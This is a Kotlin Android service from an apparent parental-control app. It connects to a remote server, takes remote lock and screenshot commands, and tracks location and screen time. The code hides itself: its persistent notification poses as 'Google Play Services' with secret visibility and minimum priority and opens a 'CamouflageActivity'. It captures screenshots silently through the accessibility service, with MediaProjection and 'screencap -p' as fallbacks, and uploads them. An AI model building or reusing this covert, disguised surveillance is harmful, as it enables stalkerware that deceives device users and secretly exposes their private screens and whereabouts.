package com.parentalcontrol.child.services

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.parentalcontrol.child.ChildApplication
import com.parentalcontrol.child.network.ChildSocketManager
import com.parentalcontrol.child.ui.CamouflageActivity
import com.parentalcontrol.child.ui.LockOverlayActivity
import com.parentalcontrol.child.ui.StatusActivity
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ForegroundSafetyService : Service() {

    companion object {
        private const val TAG = "ForegroundSafetyService"
        private const val NOTIFICATION_ID = 9001
        const val ACTION_START_PROJECTION = "com.parentalcontrol.child.action.START_PROJECTION"

        fun start(context: Context) {
            val intent = Intent(context, ForegroundSafetyService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service", e)
            }
        }

        fun startScreenProjection(context: Context, resultCode: Int, data: Intent) {
            val intent = Intent(context, ForegroundSafetyService::class.java).apply {
                action = ACTION_START_PROJECTION
                putExtra("resultCode", resultCode)
                putExtra("resultData", data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private var locationTracker: LocationTracker? = null

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "ForegroundSafetyService onCreate.")

        startForegroundWithTransparentNotification()

        // 1. Initialize Network & Socket Manager
        val sharedPrefs = getSharedPreferences("parental_prefs", Context.MODE_PRIVATE)
        val backendUrl = sharedPrefs.getString("backend_url", "http://192.168.1.5:4000") ?: "http://192.168.1.5:4000"
        val deviceId = sharedPrefs.getString("device_id", "child-220835") ?: "child-220835"

        Log.i(TAG, "Connecting socket to backendUrl=$backendUrl with deviceId=$deviceId")
        val socketManager = ChildSocketManager.getInstance(this)
        socketManager.initialize(backendUrl, deviceId)

        // Lock / Unlock remote listener
        socketManager.onLockCommandReceived = { shouldLock ->
            Log.i(TAG, "Handling onLockCommandReceived: $shouldLock")
            if (shouldLock) {
                LockOverlayActivity.show(this, "Device locked remotely by Parent.")
            } else {
                LockOverlayActivity.dismiss(this)
            }
        }

        // Remote Screenshot command listener
        socketManager.onScreenshotCommandReceived = {
            Log.i(TAG, "Handling onScreenshotCommandReceived")
            captureAndSendScreenshot(socketManager)
        }

        // 2. Start GPS Location Tracker
        try {
            locationTracker = LocationTracker(this)
            locationTracker?.startTracking()
        } catch (e: Exception) {
            Log.w(TAG, "Location tracker init postponed: ${e.message}")
        }

        // 3. Start Screen Time Monitor
        try {
            ScreenTimeMonitorService.start(this)
        } catch (e: Exception) {
            Log.w(TAG, "ScreenTimeMonitor postponed: ${e.message}")
        }
    }

    private fun captureAndSendScreenshot(socketManager: ChildSocketManager) {
        // 1. Silent Hardware Screenshot via Accessibility Service (Zero popups / Zero permissions required)
        ChildAccessibilityService.takeSilentScreenshot { silentB64 ->
            if (silentB64 != null && silentB64.length > 1000) {
                socketManager.sendScreenshot(silentB64)
                Log.i(TAG, "Silent hardware screenshot uploaded successfully via AccessibilityService.")
            } else {
                // If Accessibility screenshot was unavailable, try MediaProjection or native screencap
                Thread {
                    try {
                        val realShot = ScreenCaptureManager.getLatestScreenshotBase64()
                        if (realShot != null && realShot.length > 500) {
                            socketManager.sendScreenshot(realShot)
                            Log.i(TAG, "Real MediaProjection screen snapshot uploaded successfully.")
                            return@Thread
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "MediaProjection grab error: ${e.message}")
                    }

                    try {
                        val process = Runtime.getRuntime().exec("screencap -p")
                        val bytes = process.inputStream.readBytes()
                        if (bytes.size > 2000) {
                            val base64Str = "data:image/png;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
                            socketManager.sendScreenshot(base64Str)
                            Log.i(TAG, "Native device screenshot uploaded (${bytes.size} bytes).")
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Native screencap error: ${e.message}")
                    }
                }.start()
            }
        }
    }

    private fun startForegroundWithTransparentNotification() {
        val notificationIntent = Intent(this, CamouflageActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        // Camouflaged, silent system notification
        val notification: Notification = NotificationCompat.Builder(this, ChildApplication.CHANNEL_SAFETY_SERVICE)
            .setContentTitle("Google Play Services")
            .setContentText("Background sync active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                    )
                } catch (_: Exception) {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                }
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in startForeground", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_START_PROJECTION) {
            val resultCode = intent.getIntExtra("resultCode", android.app.Activity.RESULT_CANCELED)
            val resultData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra("resultData", Intent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("resultData")
            }
            if (resultCode == android.app.Activity.RESULT_OK && resultData != null) {
                try {
                    startForegroundWithTransparentNotification()
                    ScreenCaptureManager.init(this, resultCode, resultData)
                    Log.i(TAG, "ScreenCaptureManager successfully initialized via ForegroundSafetyService!")
                } catch (e: Exception) {
                    Log.e(TAG, "Error starting ScreenCaptureManager in service", e)
                }
            } else {
                Log.w(TAG, "ACTION_START_PROJECTION invalid code or data: code=$resultCode, data=$resultData")
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "ForegroundSafetyService onDestroy.")
        locationTracker?.stopTracking()
    }
}
